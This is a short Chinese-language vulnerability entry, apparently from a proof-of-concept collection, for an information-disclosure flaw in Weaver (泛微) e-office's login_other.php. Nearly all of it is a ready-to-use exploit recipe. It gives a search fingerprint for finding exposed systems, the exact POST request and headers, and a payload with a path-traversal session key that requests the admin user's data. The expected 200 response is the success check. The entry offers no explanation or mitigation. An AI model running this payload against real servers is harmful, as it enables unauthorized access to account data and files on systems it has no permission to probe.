# 泛微e-officelogin_other存在信息泄漏漏洞

- **系统**：泛微OA　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="eoffice_loading_tip"`
- **请求**：`POST /E-mobile/App/System/Login/login_other.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 61`

**请求体 / payload**
```
diff=getuser&id=admin&sessionkey=\\..\\..\\webroot\\index.php
```
- **预期**：200　|　check